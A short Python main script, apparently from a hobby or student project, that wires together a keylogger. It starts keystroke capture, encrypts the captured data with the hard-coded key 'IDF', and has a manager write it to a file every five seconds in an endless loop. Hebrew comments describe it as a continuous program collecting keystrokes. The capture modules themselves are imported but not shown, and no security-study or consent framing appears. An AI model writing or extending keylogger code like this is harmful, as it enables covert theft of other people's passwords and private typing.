from keylogger.encryption.encryption import Encryption
from keylogger.KeyliggerServise.KeyloggerServise import KeyLogger
from keylogger.writer.IWriter import FileWriter
from keylogger.KeyLoggerManager.Manager import KeyLoggerManager

# יצירת רכיבים
keylogger = KeyLogger()
keylogger.start_logging()
writer = FileWriter()
encryption = Encryption("IDF")

# Manager
manager = KeyLoggerManager(keylogger, writer, encryption, interval=5)
manager.start()

try:
    while True:
        pass  # תוכנית רציפה, אוספת הקשות
except KeyboardInterrupt:
    manager.stop()
    keylogger.stop_logging()